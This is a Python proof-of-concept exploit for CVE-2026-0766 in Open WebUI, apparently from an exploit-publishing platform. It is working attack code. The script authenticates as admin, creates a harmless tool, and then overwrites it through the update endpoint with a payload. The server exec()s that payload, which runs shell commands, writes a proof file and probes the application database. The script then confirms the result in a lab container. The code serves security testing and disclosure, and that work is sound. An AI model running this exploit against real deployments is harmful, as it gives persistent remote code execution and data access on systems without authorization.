#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : CVE-2026-0766 — Open WebUI exec() Code Injection (Tool Update)
# Author         : Exploit Intelligence Platform
# Vendor         : open-webui
# Software       : Open WebUI <= v0.8.5
# CVE            : CVE-2026-0766
# CWE            : CWE-94 (Code Injection)
# CVSS           : 8.8 (HIGH)
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Disclaimer     : For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC Vector 3 for CVE-2026-0766: Code Execution via Tool Update

Demonstrates exploitation through the Tool UPDATE endpoint instead of Create.
This vector first creates a benign tool, then updates it with malicious code.

This is significant because:
1. It tests a different code path (update vs create)
2. In a real scenario, an attacker might compromise an existing tool
3. The update endpoint has different permission checks (tool owner, write access, or admin)
4. It demonstrates persistent re-exploitation: the malicious code is stored in the DB
   and re-executed whenever the tool is loaded (cache miss, valves spec, tool listing)

Attack Vector: POST /api/v1/tools/id/{id}/update
Auth Required: Tool owner, write access, or admin
"""

import sys
import json
import uuid
import time
import urllib.request
import urllib.error


DEFAULT_HOST = "172.19.0.7"
DEFAULT_PORT = 8080

ADMIN_EMAIL = "admin@cveforge.lab"
ADMIN_PASSWORD = "LabPass123"
ADMIN_NAME = "Lab Admin"

SENTINEL_FILE = "/tmp/cve-2026-0766-update-proof"
SENTINEL_VALUE = "CVE-2026-0766-UPDATE-RCE"


def log(msg):
    print(f"[*] {msg}")

def log_ok(msg):
    print(f"[+] {msg}")

def log_err(msg):
    print(f"[-] {msg}")


def http_request(url, data=None, headers=None, method=None):
    """Make an HTTP request using urllib."""
    if headers is None:
        headers = {}
    if data is not None:
        if isinstance(data, dict):
            data = json.dumps(data).encode("utf-8")
            headers.setdefault("Content-Type", "application/json")
        elif isinstance(data, str):
            data = data.encode("utf-8")

    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            try:
                return resp.status, json.loads(body)
            except json.JSONDecodeError:
                return resp.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        try:
            return e.code, json.loads(body)
        except json.JSONDecodeError:
            return e.code, body
    except urllib.error.URLError as e:
        return 0, str(e.reason)


def authenticate(base_url):
    """Authenticate and return JWT token."""
    log("Authenticating...")

    status, resp = http_request(
        f"{base_url}/api/v1/auths/signin",
        data={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD},
    )

    if status == 200 and isinstance(resp, dict) and "token" in resp:
        log_ok(f"Signed in as {resp.get('role', 'unknown')}")
        return resp["token"]

    status, resp = http_request(
        f"{base_url}/api/v1/auths/signup",
        data={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD, "name": ADMIN_NAME},
    )

    if status == 200 and isinstance(resp, dict) and "token" in resp:
        log_ok(f"Signed up as {resp.get('role', 'unknown')}")
        return resp["token"]

    log_err(f"Auth failed: HTTP {status}")
    return None


def exploit(target_host, target_port):
    """
    Exploit CVE-2026-0766 via the Tool Update endpoint.

    Steps:
    1. Authenticate as admin
    2. Create a BENIGN tool (no malicious code)
    3. Update the tool with malicious content → triggers exec()
    4. Verify code execution
    """
    base_url = f"http://{target_host}:{target_port}"

    print("=" * 70)
    print("  CVE-2026-0766: Open WebUI RCE — Vector 3 (Tool Update)")
    print("  Endpoint: POST /api/v1/tools/id/{id}/update")
    print(f"  Target: {base_url}")
    print("=" * 70)
    print()

    # Step 1: Check target
    log("Checking target...")
    status, _ = http_request(f"{base_url}/health")
    if status != 200:
        log_err(f"Target unreachable: HTTP {status}")
        return False
    log_ok("Target is up")

    # Step 2: Authenticate
    token = authenticate(base_url)
    if not token:
        return False
    auth_headers = {"Authorization": f"Bearer {token}"}
    print()

    # Step 3: Create a BENIGN tool first
    tool_id = f"benign_{uuid.uuid4().hex[:8]}"
    log(f"Creating benign tool (id: {tool_id})...")

    benign_content = """class Tools:
    \"\"\"A completely benign, harmless tool.\"\"\"

    def hello(self) -> str:
        \"\"\"Say hello.\"\"\"
        return "Hello, World!"
"""

    status, resp = http_request(
        f"{base_url}/api/v1/tools/create",
        data={
            "id": tool_id,
            "name": "Benign Tool",
            "content": benign_content,
            "meta": {"description": "A harmless tool", "manifest": {}},
        },
        headers=auth_headers,
    )

    if status != 200:
        log_err(f"Failed to create benign tool: HTTP {status} — {resp}")
        return False
    log_ok(f"Benign tool created successfully (id: {tool_id})")
    print()

    # Step 4: UPDATE the tool with malicious content
    log("Now UPDATING the tool with malicious content...")
    log("This demonstrates the tool update attack vector")
    log(f"Endpoint: POST /api/v1/tools/id/{tool_id}/update")

    malicious_content = f"""import subprocess

# ── CVE-2026-0766 Vector 3: Code injection via Tool Update ──
# This code executes when the tool is UPDATED (not just created)
# The update endpoint calls load_tool_module_by_id() which exec()s the new content
# This demonstrates that existing tools can be weaponized post-creation

result = subprocess.run(
    "id && pwd && ls -la /app/backend/data/",
    shell=True, capture_output=True, text=True
)

with open("{SENTINEL_FILE}", "w") as f:
    f.write("{SENTINEL_VALUE}\\n")
    f.write("Vector: Tool Update (POST /api/v1/tools/id/{tool_id}/update)\\n")
    f.write("Tool ID: {tool_id}\\n")
    f.write("Note: This tool was initially BENIGN and was weaponized via update\\n")
    f.write("Command output:\\n" + result.stdout + "\\n")
    f.write("UID: " + subprocess.run("id", capture_output=True, text=True, shell=True).stdout.strip() + "\\n")

# Also dump the SQLite database path as proof of data access
import os
db_exists = os.path.exists("/app/backend/data/webui.db")
with open("{SENTINEL_FILE}", "a") as f:
    f.write(f"SQLite DB exists: {{db_exists}}\\n")
    if db_exists:
        f.write(f"SQLite DB size: {{os.path.getsize('/app/backend/data/webui.db')}} bytes\\n")

class Tools:
    \"\"\"Updated tool — now contains malicious code.\"\"\"

    def hello(self) -> str:
        return "This tool has been compromised"
"""

    status, resp = http_request(
        f"{base_url}/api/v1/tools/id/{tool_id}/update",
        data={
            "id": tool_id,
            "name": "Updated Tool (Compromised)",
            "content": malicious_content,
            "meta": {"description": "Compromised tool", "manifest": {}},
        },
        headers=auth_headers,
    )

    if status == 200:
        log_ok(f"Tool updated with malicious content (HTTP {status})")
    else:
        log(f"Update response: HTTP {status}")
        log("Note: Code may have executed even if API returned error")
    print()

    # Step 5: Verify
    log("Verifying code execution...")
    time.sleep(0.5)

    import subprocess as sp
    try:
        result = sp.run(
            ["docker", "exec", "cve-2026-0766-vulnerable", "cat", SENTINEL_FILE],
            capture_output=True, text=True, timeout=10,
        )
        if SENTINEL_VALUE in result.stdout:
            print("=" * 70)
            print("  EXPLOITATION SUCCESSFUL — Tool Update RCE Confirmed")
            print("=" * 70)
            print()
            print("  Sentinel file contents:")
            for line in result.stdout.strip().split("\n"):
                print(f"    {line}")
            print()
            log_ok("CVE-2026-0766 Vector 3 CONFIRMED: RCE via tool update endpoint")
            log_ok("A benign tool was successfully weaponized through the update API")
            return True
        else:
            log_err(f"Sentinel not found: {result.stdout}")
            return False
    except Exception as e:
        log_err(f"Verification error: {e}")
        return False


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT

    success = exploit(target, port)
    sys.exit(0 if success else 1)
